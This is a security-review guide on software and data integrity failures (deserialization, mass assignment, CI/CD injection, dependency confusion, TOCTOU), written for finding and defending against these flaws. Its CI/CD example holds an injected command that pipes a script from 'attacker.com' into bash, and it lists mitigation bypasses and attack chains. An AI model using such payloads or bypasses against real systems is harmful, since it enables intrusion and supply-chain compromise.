# A08: Software and Data Integrity Failures

Integrity failures occur when code or data is used without verifying that it has not been tampered with. This category covers insecure deserialization, CI/CD pipeline manipulation, unsigned updates, dependency confusion, mass assignment, and any scenario where the application trusts data or code without integrity verification.

## Key Patterns to Search For

Search for these patterns to identify potential integrity failures:

- **Insecure Deserialization (Java)**: `ObjectInputStream`, `readObject()`, `XMLDecoder`, `XStream`, `SnakeYAML.load()`, `Jackson` with `enableDefaultTyping()` or `@JsonTypeInfo`
- **Insecure Deserialization (Python)**: `pickle.loads(`, `pickle.load(`, `yaml.load(` (without Loader=SafeLoader), `shelve.open(`, `marshal.loads(`
- **Insecure Deserialization (PHP)**: `unserialize(`, `maybe_unserialize(`
- **Insecure Deserialization (Ruby)**: `Marshal.load(`, `YAML.load(` (without safe_load), `Oj.load(`
- **Insecure Deserialization (.NET)**: `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `ObjectStateFormatter`, `LosFormatter`, `JavaScriptSerializer` with type handling
- **Mass Assignment**: `Model.create(req.body)`, `Model.update(req.body)`, `@ModelAttribute`, `strong_parameters` bypass, `attr_accessible`, `$fillable`/`$guarded` in Laravel, `update_attributes(params)`
- **CI/CD Configuration**: `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`, `.circleci/config.yml`, `.travis.yml`, `azure-pipelines.yml`, pipeline scripts that execute untrusted input
- **Dependency Installation**: `npm install`, `pip install`, `gem install`, pre/post-install scripts in packages, custom package registries
- **Auto-Binding**: Framework features that automatically bind request parameters to object properties without explicit whitelisting

## Common Vulnerable Patterns

**Insecure Deserialization (Python pickle):**
```
# Vulnerable: deserializing untrusted data
import pickle
data = pickle.loads(request.body)  # Arbitrary code execution

# Attacker sends crafted pickle payload that executes os.system("...")
```

**Insecure Deserialization (Java):**
```
// Vulnerable: deserializing untrusted input
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // Gadget chain leads to RCE
```

**Mass Assignment:**
```
# Vulnerable: all request parameters mapped to model
@app.route('/api/users', methods=['POST'])
def create_user():
    user = User(**request.json)  # Attacker adds: {"role": "admin"}
    db.session.add(user)
    db.session.commit()
```

**Mass Assignment (Rails):**
```
# Vulnerable: no strong parameters
def update
  @user.update(params[:user])  # Attacker includes admin: true
end
```

**CI/CD Pipeline Injection:**
```
# Vulnerable: GitHub Actions workflow using PR title in a run command
- name: Build
  run: echo "Building ${{ github.event.pull_request.title }}"
  # Attacker PR title: $(curl attacker.com/shell.sh | bash)
```

**Unsigned Dependency Installation:**
```
# Vulnerable: installing from untrusted source without integrity check
pip install --index-url http://internal-registry.company.com/simple package-name
# No --require-hashes, no signature verification
# Attacker who compromises the registry or network can substitute packages
```

**TOCTOU Race Condition:**
```
# Vulnerable: time-of-check-time-of-use
if os.access(filepath, os.R_OK):    # Check: file is readable
    time.sleep(0.001)                # Window of opportunity
    data = open(filepath).read()     # Use: file may have changed
    # Attacker swaps file between check and use via symlink
```

## Exploitability Indicators

An integrity failure is exploitable when:

- User-controlled data is deserialized using an unsafe deserializer (pickle, Java ObjectInputStream, PHP unserialize) and gadget classes are available in the classpath
- Mass assignment allows setting privileged fields (role, is_admin, balance, verified) through user-controlled request parameters
- CI/CD pipelines execute commands that include untrusted input (PR titles, branch names, commit messages) without sanitization
- Package installation occurs from registries without integrity verification (no hash pinning, no signature checking)
- The application accepts updates or plugins without cryptographic signature verification
- Auto-binding frameworks map request parameters to model properties without an explicit whitelist of allowed fields
- File operations are subject to TOCTOU conditions where an attacker can race between the check and the use

## Common Mitigations and Their Bypasses

**Mitigation: Using JSON instead of binary serialization formats**
Bypass: JSON itself is safe, but check if the JSON parser supports type hints or polymorphic deserialization. Jackson's `@JsonTypeInfo`, .NET's `$type`, and similar features reintroduce deserialization risks.

**Mitigation: Mass assignment protection (strong parameters, $fillable)**
Bypass: Check if the whitelist is comprehensive. New model fields added later may not be added to the whitelist. Check for alternative update paths that bypass the protection (direct attribute setting, raw queries, nested attributes).

**Mitigation: Pinning dependency versions**
Bypass: Version pinning prevents unexpected upgrades but does not verify integrity. A compromised registry can serve a malicious package at the pinned version number. Use hash pinning for true integrity verification.

**Mitigation: Code review for CI/CD changes**
Bypass: Attackers can inject through external inputs that do not require code changes: PR titles, issue comments, branch names, and environment variables that are used in pipeline scripts.

**Mitigation: Disabling default typing in Jackson**
Bypass: Check for `@JsonTypeInfo` annotations on individual classes that re-enable type-based deserialization. Also check for custom deserializers that may be vulnerable.

## Rejection Rationalizations and Counter-Arguments

**"We only deserialize data from authenticated users."**
Counter: Authenticated users can be compromised, malicious, or victims of XSS that sends crafted serialized payloads. Deserialization should be safe regardless of the source.

**"Mass assignment is not exploitable because we use UUIDs for IDs."**
Counter: Mass assignment is not about ID guessing. It is about setting privileged fields: role, is_admin, balance, verified_email, subscription_tier. These fields are set regardless of the ID format.

**"Our CI/CD pipeline is internal and not exposed."**
Counter: Pull requests from forks, branch names, and commit messages are attacker-controlled inputs that flow into CI/CD pipelines. Supply chain attacks target build infrastructure specifically.

**"Pickle deserialization is only used for caching."**
Counter: If the cache is shared, network-accessible, or populated with data that was originally user-controlled, the deserialization is exploitable. Redis, Memcached, and file-based caches can all be poisoned.

## Chaining Opportunities

- **Insecure Deserialization + Available Gadgets = RCE**: Deserialization of untrusted data with known gadget chains (ysoserial for Java, PHPGGC for PHP) provides direct remote code execution.
- **Mass Assignment + Privilege Escalation = Admin Access**: Setting the role or admin flag via mass assignment grants immediate admin privileges.
- **CI/CD Injection + Supply Chain = Compromised Builds**: Injecting commands into CI/CD pipelines can modify build artifacts, inject backdoors, or exfiltrate secrets.
- **Dependency Confusion + Internal Package Name = Code Execution**: Publishing a public package with the same name as an internal package, at a higher version, tricks package managers into installing the attacker's code.
- **TOCTOU + Symlink = Privilege Escalation**: Racing a file check with a symlink swap can trick privileged processes into reading or writing attacker-controlled files.
